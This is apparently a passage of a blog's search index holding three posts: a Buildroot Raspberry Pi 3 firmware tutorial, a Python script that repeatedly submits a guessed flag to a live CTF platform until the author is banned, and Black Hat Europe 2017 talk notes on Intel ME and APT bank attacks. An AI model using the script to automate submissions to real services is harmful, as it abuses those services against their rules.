buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"I.2. dd on the SD card Now the build is ready for the Raspberry Pi 3, a little shot of dd on the SD card, and it’s done. As mention above, the root filesystem is not required here, then I edited the “genimage-raspberrypi3.cfg” file, and remove this part. I saved the new file in “genimage-raspberrypi3-ENSIBS.cfg”. Given that we modified the genimage name, I have to edit the “post-image.sh” file too (cf. Annexe 1 - Genimage ENSIBS \u0026 post-image.sh). The firmware is ready, I have to build it, just make command in the buildroot root folder. When all dependencies are installed, I flashed the SD card: dd if=output/images/sdcard.img of=/dev/mmcblk ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:1:2","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"II. Step 2 The step 2 consists to add the network layer in our firmware. As well as a path that allows us to edit configuration files in the firmware (it’s a overlays). Goals are: Setting up an overlay Configuration of the network layer ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:2:0","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"II.1. Setting up on overlay An overlay is a folder on the host system, it allows us to edit files in the firmware. Typically, we have to edit the interfaces file in /etc/network/ folder to setting up the network layer of our firmware. For this, I just have to create a directory and mention it in buildroot. For example, my path is: /home/billy/Documents/Cours/ENSIBS/secuEmbarque In the first instance, the folder is empty, but at the end of the project, here is mine: ▶ tree . . └── etc ├── init.d │ └── S40network ├── network │ └── interfaces └── profile 3 directories, 3 files ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:2:1","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"II.2. Network configuration On the basis of the previous tree, we had to edit the interfaces and S40network file. First of all, I noticed that the startup script for the ethernet interface (S40network) is triggered before the network card (hardware). I just add a 5 seconds sleep (cf. Annexe 2 - Sleep in S40Network file). The “interface” file (cf. Annexe 3 - Static network configuration) allows the firmware to get a static address IP, a gateway, static network mask on a specific interface (i.e eth0 here). The firmware will have the IP address: 10.1.49.4⁄24 and the gateway will be my host system: 10.1.49.3. ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:2:2","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"II.3. Dropbear SSH installation To install a known package in buildroot, it’s pretty easy. I just have to select it in the buildroot menuconfig: Target packages → Network Applications → dropbear Now, I must rebuild the firmware and flash again the SD card. The default configuration of dropbear allows root connection, in our case, the only user on the firmware is the root user. I will maybe add a hardening part later :D Connection as root on the raspberry pi through SSH: ssh root@10.1.49.4 ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:2:3","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"II.4. Update through network The network connection is necessary to update (through SSH) the Raspberry Pi without unplugging the SD card from the Pi. I made a little script (cf. Annexe 4 - Update script) to do this. It following those steps: Copy the new firmware on the Pi (scp) Use the dd command to write the firmware on the SD card Restart the Raspberry Pi ▶ firm_upgrade sdcard.img /dev/mmcblk0 10.1.49.4 This method works because the system is load in the RAM, so it won’t do any call to the SD card. By the way, we could remove the SD card from the raspberry pi during it operates, it will still work. To improve my script, I could copy only the zImage file instead of the complete firmware (sdcard.img), for the V2! :p ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:2:4","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"III. Step 3 For this final step, I will install an external package (have to download sources, compile them and install, do the same thing with dependencies) and startup this package at boot. Goals are: Install external package Check dependencies Start the package at boot ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:3:0","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"III.1. Install external package The external package is: nInvaders. A Space Invaders for terminal! Very cool! :D Tells to buildroot that we want to add an external package in the firmware, I have to add an entry Config.in (located in the root directory of buildroot). After that, the external package appears in the menuconfig of buildroot. buildroot/Config.in [...] menu \"ninvaders [external repo]\" source package/ninvaders/Config.in endmenu [...] Then, create two files “Config.in”, “ninvaders.mk” in a folder called “ninvaders” (we have to create the folder). ▶ tree ninvaders ninvaders ├── Config.in └── ninvaders.mk Config.in: This file tells to buildroot name of the external package, dependencies and help menu. ninvaders.mk: It’s a Makefile, it will build the package with all dependencies, but it’s not a standard Makefile, there is some environment variable and other settings manage by buildroot for the architecture (here it’s for Raspberry Pi 3). Files are available in Annexe 5. ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:3:1","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"III.2. Check dependencies NInvaders package needs ncurses dependancies. Fortunately, this package is easy to install and don’t need further dependencies. In the file Config.in of nInvaders, there is the following line: select BR2_PACKAGE_NCURSES It will specify to buildroot that nInvaders needs ncurses. To compile this dependency, we just need to add this line in our Makefile ninvaders.mk: NINVADERS_DEPENDENCIES = ncurses After a little make, the package nInvaders is successfully installed! Now, just connect to the Pi through SSH and execute ninvaders: ninvaders ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:3:2","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"III.3. Start the package at boot When the nInvaders package is successfully installed, we will execute it automatically when a session opens. In our overlays, we need to add (at the end) the profile file in folder /etc of the firmware with the following lines: export TERM=xterm ninvaders Complete file is available in Annexe 6 - /etc/profile file. The profile file will be executed when user shell is open. It’s quite like .bashrc with a bash shell. ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:3:3","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"Conclusion To conclude this article, this project was very interesting, it’s a good introduction for people (like me) without knowledge of firmware building. ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:4:0","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"TODO Hardening part Update script Build more interesting (honeypot IoT ?) Annexes ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:4:1","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"Annexe 1 - Genimage ENSIBS \u0026 post-image.sh genimage-raspberrypi3-ENSIBS.cfg image boot.vfat { vfat { files = { \"bcm2710-rpi-3-b.dtb\", \"rpi-firmware/bootcode.bin\", \"rpi-firmware/cmdline.txt\", \"rpi-firmware/config.txt\", \"rpi-firmware/fixup.dat\", \"rpi-firmware/start.elf\", \"rpi-firmware/overlays\", \"zImage\" } } size = 32M } image sdcard.img { hdimage { } partition boot { partition-type = 0xC bootable = \"true\" image = \"boot.vfat\" } } post-image.sh #!/bin/sh BOARD_DIR=\"$(dirname $0)\" BOARD_NAME=\"$(basename ${BOARD_DIR})\" #GENIMAGE_CFG=\"${BOARD_DIR}/genimage-${BOARD_NAME}.cfg\" GENIMAGE_CFG=\"${BOARD_DIR}/genimage-raspberrypi3-ENSIBS.cfg\" GENIMAGE_TMP=\"${BUILD_DIR}/genimage.tmp\" case \"${2}\" in --add-pi3-miniuart-bt-overlay) if ! grep -qE '^dtoverlay=' \"${BINARIES_DIR}/rpi-firmware/config.txt\"; then echo \"Adding 'dtoverlay=pi3-miniuart-bt' to config.txt (fixes ttyAMA0 serial console).\" cat \u003c\u003c __EOF__ \u003e\u003e \"${BINARIES_DIR}/rpi-firmware/config.txt\" # fixes rpi3 ttyAMA0 serial console dtoverlay=pi3-miniuart-bt __EOF__ fi ;; esac rm -rf \"${GENIMAGE_TMP}\" genimage \\ --rootpath \"${TARGET_DIR}\" \\ --tmppath \"${GENIMAGE_TMP}\" \\ --inputpath \"${BINARIES_DIR}\" \\ --outputpath \"${BINARIES_DIR}\" \\ --config \"${GENIMAGE_CFG}\" exit $? ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:5:0","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"Annexe 2 - Sleep in S40network file overlays/etc/init.d/S40network #!/bin/sh # # Start the network.... # # Debian ifupdown needs the /run/network lock directory mkdir -p /run/network case \"$1\" in start) printf \"Starting network: \" sleep 5 /sbin/ifup -a [ $? = 0 ] \u0026\u0026 echo \"OK\" || echo \"FAIL\" ;; stop) printf \"Stopping network: \" /sbin/ifdown -a [ $? = 0 ] \u0026\u0026 echo \"OK\" || echo \"FAIL\" ;; restart|reload) \"$0\" stop \"$0\" start ;; *) echo \"Usage: $0 {start|stop|restart}\" exit 1 esac exit $? ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:6:0","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"Annexe 3 - Set static IP address overlays/etc/network/interfaces auto lo eth0 iface lo inet loopback iface eth0 inet static address 10.1.49.4 netmask 255.255.255.0 gateway 10.1.49.3 ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:7:0","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"Annexe 4 - Update script #!/bin/sh ############# # Upgrade script for buildroot ############# function upgrade() { printf \"[+] Upgrade starting...\\n\" scp $1 root@$3:/root/ printf \"[+] New firmware copied on the guest system.\\n\" ssh root@$3 \"dd if=/root/$1 of=$2 bs=1M \u0026\u0026 /sbin/reboot\" printf \"[+] Release installed ! Rebooting.\\n\" } # Main program if [[ $# == 0 ]]; then printf \"[!] Missing args !\\n$(basename \\\"$0\\\") \u003cnew release\u003e \u003cpartition path on guest\u003e \u003cguest ip\u003e\\nEx : $(basename \"$0\") sdcard.img /dev/mmcblk0 10.1.49.4\" else # $1 = Path of the new release # $2 = Path of the disk on the guest, ex : /dev/mmcblk0 # $3 = IP of the guest upgrade $1 $2 $3 fi ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:8:0","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"Annexe 5 - Config.in and ninvaders.mk buildroot/package/ninvaders/Config.in config BR2_PACKAGE_NINVADERS bool \"ninvaders\" select BR2_PACKAGE_NCURSES help Space invaders for RPi3 with Buildroot.r buildroot/package/ninvaders/ninvaders.mk ################################################################################ # # ninvaders # ################################################################################ NINVADERS_VERSION = 0.1.1 NINVADERS_SITE = https://downloads.sourceforge.net/project/ninvaders/ninvaders/$(NINVADERS_VERSION) NINVADERS_DEPENDENCIES = ncurses define NINVADERS_BUILD_CMDS $(TARGET_MAKE_ENV) $(MAKE) $(TARGET_CONFIGURE_OPTS) -C $(@D) all endef define NINVADERS_INSTALL_TARGET_CMDS $(INSTALL) -m 0755 -D $(@D)/nInvaders $(TARGET_DIR)/usr/bin/ninvaders endef $(eval $(generic-package)) ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:9:0","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"Annexe 6 - /etc/profile file overlays/etc/profile export PATH=/bin:/sbin:/usr/bin:/usr/sbin if [ \"$PS1\" ]; then if [ \"id -u\" -eq 0 ]; then export PS1='# ' else export PS1='$ ' fi fi export PAGER='/bin/more ' export EDITOR='/bin/vi' # Source configuration files from /etc/profile.d for i in /etc/profile.d/*.sh ; do if [ -r \"$i\" ]; then . $i fi unset i done export TERM=xterm ninvaders ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:10:0","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"Some trolling results into CTF ban.. :).","date":"2018-01-22","objectID":"maki.bzh/shorts/pythonrequestforban/","tags":["ecw","troll","python","requests","fun"],"title":"Python3 Requests for fun and... Ban","uri":"maki.bzh/shorts/pythonrequestforban/"},{"categories":["Shorts"],"content":"The goal I always wanted to learn how to use requests library in Python3. It’s very helpful in daily life or in CTF… And actually, there is EuropeanCyberWeek CTF, so let’s try to do something useful: Auto flag submitter ","date":"2018-01-22","objectID":"maki.bzh/shorts/pythonrequestforban/:1:0","tags":["ecw","troll","python","requests","fun"],"title":"Python3 Requests for fun and... Ban","uri":"maki.bzh/shorts/pythonrequestforban/"},{"categories":["Shorts"],"content":"State of the art First of all, I need the requests structure, to get this information, just open BurpSuite (if you’re a bit stupid like me), or you’re Firefox web console and request the chosen challenge (Drone Wars 3 for example). POST /chal/19 HTTP/1.1 Host: challenge-ecw.fr User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://challenge-ecw.fr/challenges Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 143 Cookie: session=\u003cJSON Web Token\u003e Connection: close key=test\u0026nonce=a36e189c9edf96b7ff561b1dc65bf6e0715af51eb5cb46f36a63d45c57665a24859242501669a17cac47eec04e1dc4e3f1646abd028d32a4e629929f1d0e816d We have few interesting things: Request: challenge-ecw.fr/chal/19 URL: https://challenge-ecw.fr/challenges#DroneWars%20(3/3) Cookie: JSON Web Token key: The submitted flag (here is test) nonce: Random number to avoid CSRF vulnerability ","date":"2018-01-22","objectID":"maki.bzh/shorts/pythonrequestforban/:2:0","tags":["ecw","troll","python","requests","fun"],"title":"Python3 Requests for fun and... Ban","uri":"maki.bzh/shorts/pythonrequestforban/"},{"categories":["Shorts"],"content":"Python requests Ok, now we know how to do our script. Start to install the desired library: $ pip install --user Requests Initialize a Session() object, this object will get all headers and after you can do GET or POST requests normally. I had to do a little trick to get the nonce random: \u003e\u003e\u003e import requests \u003e\u003e\u003e import re \u003e\u003e\u003e s = requests.Session() \u003e\u003e\u003e cookie = {'session':'.eJwNz0FrgzAUwPGv[...]52miEJF5lBEfaqEd1dHs'} \u003e\u003e\u003e url = 'https://challenge-ecw.fr/challenges#DroneWars%20(3/3)' \u003e\u003e\u003e html = s.get(url, cookies=cookie).text.split('\\n') \u003e\u003e\u003e for i in html: \u003e\u003e\u003e if re.search('nonce', i): \u003e\u003e\u003e nonce=i.split('=')[4][:-1] \u003e\u003e\u003e print(nonce) 36e189c9edf96b7ff561b1dc65bf6e0715af51eb5cb46f36a63d45c57665a24859242501669a17cac47eec04e1dc4e3f1646abd028d32a4e629929f1d0e816d It works! Now we just have to do a little POST requests with our key and nonce. \u003e\u003e\u003e data = {'key':'ECW{Bite de poulet}', 'nonce':nonce} \u003e\u003e\u003e print(s.post('https://challenge-ecw.fr/chal/19', cookies=cookie, data=data).text) { \"status\": \"2\", \"message\": \"Incorrect.\" } I flagged a challenge to see if the message was different, and it was. Instead of “Incorrect”, you got “Correct” (CTFd guys are very smart :D). ","date":"2018-01-22","objectID":"maki.bzh/shorts/pythonrequestforban/:3:0","tags":["ecw","troll","python","requests","fun"],"title":"Python3 Requests for fun and... Ban","uri":"maki.bzh/shorts/pythonrequestforban/"},{"categories":["Shorts"],"content":"Full code #!/usr/bin/python3 import requests import re import time s = requests.Session() cookie = {'session':'.eJwNz0FrgzAUwP[...]JF5lBEfaqEd1dHs'} url = 'https://challenge-ecw.fr/challenges#DroneWars%20(3/3)' html = s.get(url, cookies=cookie).text.split('\\n') for i in html: if re.search('nonce', i): nonce=i.split('=')[4][:-1] data = {'key':'ECW{Bite de poulet}', 'nonce':nonce} g = open('counter.txt', 'r') j = int(g.read().split('\\n')[0]) g.close() while(1): coucou = s.post('https://challenge-ecw.fr/chal/19', cookies=cookie, data=data) nope = coucou.text if nope.split('\"')[7] == \"Incorrect\": j = j+1 f = open('counter.txt', 'w') f.write(str(j)+'\\n') f.write(str(nope)) f.close() else: f = open('counter.txt', 'a') f.write(str(nope)) f.close() exit() time.sleep(600) I know, mine has more features… But I got a new status :O $ ./coucou.py { \"status\": \"3\", \"message\": \"You are banned.\" } Maybe the flag was ECW{MD5(Bite de poulet)}… ","date":"2018-01-22","objectID":"maki.bzh/shorts/pythonrequestforban/:4:0","tags":["ecw","troll","python","requests","fun"],"title":"Python3 Requests for fun and... Ban","uri":"maki.bzh/shorts/pythonrequestforban/"},{"categories":["Shorts"],"content":"Conclusion To conclude this little blog post, from a personal point of view, I found ECW CTF boring. CTF are used to learn things, useful or not, nevermind. Here, we have guessing and bruteforce challenge… Well, I’m actually banned, have fun. But don’t overuse my little spammer, try to be eligible for the final it’s really interesting, I did it last year (2017). Thanks reading this, take care of yourself \u003c3 ","date":"2018-01-22","objectID":"maki.bzh/shorts/pythonrequestforban/:5:0","tags":["ecw","troll","python","requests","fun"],"title":"Python3 Requests for fun and... Ban","uri":"maki.bzh/shorts/pythonrequestforban/"},{"categories":["Posts"],"content":"Feedback on the Black Hat Europe 2017.","date":"2017-10-03","objectID":"maki.bzh/bheu2017/","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"Introduction First of all, thanks, Black Hat to win places for a student! I filled the annual survey and that happens, it’s crazy! Then, me and 3 my friends (see below) went to London! @GregoireMolveau @razaborg @L4rg0_W1nch All briefing was interesting, but the most impressive one was on Intel ME from Mark Ermolov, Maxim Goryachy and Dimitry SKLYAROV I’ll present this article by day and briefing. At the end of each briefing, I’ll add a personal point of view. So, let’s start! :) ","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:1:0","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"Day 1 ","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:2:0","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"Diplomacy and Combating Evolving International Cyber Threats Chris Painter - State department’s top cyber diplomat Chris Painter talked about the history of the cyber in his country, and his own history. The presentation highlights something interesting, according to Chris Painter, policy threats are more often dangerous than technical threats. The world is more and more connected, and everything is connected to the Internet. It’s the main reason why Wannacry and NotPetya did so much damage in UK (and obviously in other countries). Also, it’s very difficult, even impossible, to assign an attack to a group or state/government. At last, a government does not disclose all information about an attack. Chris Painter told about worldwide cyber norms during peacetime (1) and wartime to harmonize instructions. Laws processes are too slow, so if you don’t respect norms, there are no sanctions yet… Another sensitive point is terrorism. Chris Painter said that we have to monitor people to monitor terrorism because they use the internet to communicate with each other, not attacks. Finally, it’s hard to ask a physical and/or military response to a cyber attack if there is not at least one death. From a personal point of view, it was interesting to see how the UK manages cyber attacks and what is planned for the future. Sources document Fergus Hanson, Norms of Cyber War in Peacetime, Sunday, November 15, 2015. https://www.lawfareblog.com/norms-cyber-war-peacetime Mei Gechlik, Appropriate Norms of State Behavior in Cyberspace: Governance in China and Opportunities for US Businesses, Aegis Series Paper No. 1706. https://www.hoover.org/sites/default/files/research/docs/gechlik_webreadypdf.pdf Wikipedia, Colossus computer. https://en.wikipedia.org/wiki/Colossus_computer ","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:2:1","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"By-design Backdooring of Encryption System - Can we trust Foreign Encryption Algorithms Arnaud BANNIER \u0026 Eric FILIOL (speaker) from ESIEA Few countries (French, Germany, thee UK and so on) are asking for encryption backdoor law (2⁄3) in IoT. Since World War 2, there is a government (G-20 countries now) control on cryptography. Eric FILIOL says that there are differences between trapdoor and backdoor. Trapdoor: Feature of asymmetrical encryption. Backdoor: Unwanted feature for attacker benefits. In mathematical backdoors, there is two type of weaknesses. Natural: For example, elliptic curves with specific points. Intended: Intentional misconception. Now, the question is: Can we trust cryptographic algorithms from a third-party country? There are not many choices in cryptography, for public symmetrical and secure algorithms, we have only AES at this time. Eric FILIOL advises us to read Verschlüsselt, Der Fall Hans Bühler. This book talks about an Iranian guy that proves cryptographic algorithms were backdoored. At this time, algorithms were not public, this man was arrested in 1992. The NSA did a new cryptographic algorithm for IoT, but after pressure, from experts and corporate, ISO rejected the standard. The researcher Eric FILIOL talked about the BEA-1 algorithm and how is it possible to inject a mathematical backdoor. His presentation (1) present all the process, I let you check it :) From a personal point of view, this presentation was a good introduction to backdoors in encryption algorithms. But, honestly, I didn’t understand everything :-) Sources documents Arnaud BANNIER \u0026 Eric FILIOL, Black Hat presentation, Wednesday, December 6, 2017. https://www.blackhat.com/docs/eu-17/materials/eu-17-Filiol-By-Design-Backdooring-Of-Encryption-System-Can-We-Trust-Foreign-Encryption-Algorithms.pdf Kieren MCCARTHY, French, German ministers demand new encryption backdoor law, August 26, 2016. https://www.theregister.co.uk/2016/08/24/french_german_ministers_call_for_new_encryption_backdoor_law/ James VINCENT, UK government renews calls for WhatsApp backdoor after London attack, March 27, 2017. https://www.theverge.com/2017/3/27/15070744/encryption-whatsapp-backdoor-uk-london-attacks Cryptographic laws in different countries. http://www.cryptolaw.org/ ","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:2:2","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"Intel ME: Flash File System Explained Dimitry SKLYAROV - Positive Technologies Dimitry SKLYAROV starts his presentation by introducing the Intel Management Engine and the hierarchy in a computer. Hierarchy of a computer: User OS Kernel Hypervisor System Management Mode (SMM) Management Engine (ME) Top layer (user) has limited permission on the under layer (OS Kernel) and this mecanism works until the fifth layer. On the other hand, the under layer has full access on the top one. Then, from 1 to 5 -\u003e limited access and from 5 to 1 -\u003e Full access. To conclude, Intel ME got full access to the machine. I let you imagine what happens if malware goes into the ME. The ME is a standalone electronic chip before the CPU, it interacts with all other components. Dimitry SKLYAROV says that before trying to flash the Intel ME, you have to erase it completely. But, there is a limited number of cycles (between 10 000 and 1 000 000). After this limit, the ME is unusable. Intel made design the flash with incremental modification to avoid redundantly erases and distribute erases between block as evenly as possible to preserve the ME. After the introduction, Dimitry SKLYAROV talked about MFS pagination. Inside the ME, all MFS page has the same size (8192 bytes), starts with the same header (0xAA557887) and there is always an empty page. Signature USN nErase iNextErase firstChunk csum 0x00 Signature: Always 0xAA557887 USN: Update Sequence Number nErase: How many times page has been erased iNextErase: Index of next to be erased page firstChunk: Index of first chunk (for Data page) csum: Checksum Each page contains 66 bytes chunks, it’s an addressable and modifiable unit in the page of the MFS. Those chunks contain 2 bytes of checksum at the end (CRC-16). Dimitry SKLYAROV mentions that reversing CRC-16 allows easy calculation of the chunk index. By the way, indexing is the reason why checksum is different for the same data. Just after the header chunk, there is the system chunk. As the Dimitry SKLYAROV picture shows below, this chunk is composed of: Chunk# 0x1201: Chunk full of zero Chunk# 0x1202: Two first bytes at F4 D4 followed by a complete chunk full of zero Chunk# 0x1203: Two first bytes at A7 B1 followed by a complete chunk full of zero Chunk# 0x1204: Two first bytes at 96 B2 followed by a complete chunk full of zero … axIdx is a 16 bits array, entries of this array are the number of chunks + 1 and it is dynamically XORed. The key value depends on the previous value from axIdx. You can recover it by reversing CRC-16 function (in fact, it’s a modified algorithm stripped to 14 bits). Data pages are easier to understand. After the header page, there is the aFree bit. This bit tells if the data chunk contains something or not (aFree[i] == 0xFF). Each Data chunk is stored once with a sequential number started from the first chunk. System chunks are stored accords to the update order, not sequentially. Then, an index from System page is derived from axIdx value. Now, to extract data, Dimitry SKLYAROV explains that you have to follow this diagram: Diagram int32 - Volume Signature (0x724F6201) int32 - Volume Version ? int32 - Total capacity: System area + Data area int16 - Number of files records int16 - File allocation table Low-Level MFS does not support file names. Files are identified by numbers (from 0 to nFiles-1). Let Dimitry SKLYAROV explains his diagram: Calculate the index in File Allocation Table: ind = aFAT[iFile]. Values 0x0000 for unused and 0xFFFE for erased means that file does not exist and values 0xFFFF means empty file. ind must be between nFiles and aFAT length. Extract chunk data Calculate the next index If the new value is between 0 and chunk size MFS, then output first ind bytes of data and goes to the end of the process. Output all 64 bytes of data and processes to step 2. After that, Dimitry SKLYAROV did an MFS template from fit.exe. Then MFS is composed of: Dimitry SKLYAROV attentions was on Slot 6, containing the intel.cfg ","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:2:3","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"Nation-State Moneymule’s Hunting Season - APT Attacks Targeting Financial Institutions Min-Chang Jang (speaker), Chi-en Shen (speaker) \u0026 Kyoung-Ju Kwak from KFSI \u0026 Team T5 They started to introduce different groups and made a timeline of different attacks: ","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:2:4","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"Korea Major Bank Attack By Bluenoroff In March 2017, the Korea major bank has been attacked. Targets were employees in charge of the SWIFT system. Bluenoroff found a 0day in a file sharing function in VDI Program (4). No severe damage and only 2 PC infected Malware used is in Manuscrypt family. Research for SWIFT network. Activate NamedPipe of a specific process. Look for desired data and send them to C\u0026C server. IP was hidden in a plain registry key. Data sent to the C2 were encoded. And here is how analyst were able to decode the data: ","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:2:5","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"ATM Operator Company Break aka VANXATM The operation started from Feb 2015 and leakage in March 2017. The target is ATM Operator Company (manage more than 2000 ATM). Andareil group used a 0day in AV and misconfiguration/mismanagement between ATM machines and ATM update server. 230 000 credit card information leaked. Malware fs.exe: Scan AV server’s service port Connect to server Send file Run file Look for Transaction date/time, account number issuers, request amount and balance. For the VANXATM case, Andariel group targeted only 64 ATM, because they have plain credit card information on a FTP. ","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:2:6","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"Bitcoin Exchanges Hacked Four Bitcoin exchanges were attacked. Attacker impersonates the public institutes for phishing and they used nine email accounts for attack (4 out 9 were stolen). Mobile malware to bypass SMS authentication. Sample hash: 22a279c5685d7c3e24c04580204a8a932b2909a77a549bdd7bcf7ead285efde9 They used Ghostscript vulnerability (kind of macro attack). Personal point of view, malware developed by those groups are not “complicated”. They’re not (or few) obfuscated, the real exploit is the recon step. They can use cryptocurrencies to buy C\u0026C server, to be more difficult to find. Bitcoin obtained via stole or ransomed action. According to McAfee, Lazarus moved to mobile platforms (2). Unit 42 from Palo Alto discovered a cluster of malware, which targets Samsung devices and Korean Languages speakers (3). Andariel acts during company activity, to be quieter during the attack. From a personal point of view, it is pretty cool to see how this kind of attack is defeated, and how those cybercriminals planned their actions. I’m just a bit surprised by malware developed by those groups, they are not encrypted or very hard to reverse. Sources documents Chi-En Shen, Min-Chang Jang \u0026 Kyoung-Ju Kwak, Black hat presentation, Wednesday, December 6, 2017. https://www.blackhat.com/docs/eu-17/materials/eu-17-Shen-Nation-State%20Moneymules-Hunting-Season-APT-Attacks-Targeting-Financial-Institutions.pdf Christian Beek, Lazarus Cybercrime Group Moves to Mobile Platform, November 20, 2017. https://securingtomorrow.mcafee.com/mcafee-labs/lazarus-cybercrime-group-moves-to-mobile/ Anthony Kasza, Juan Cortes, and Micah Yates, 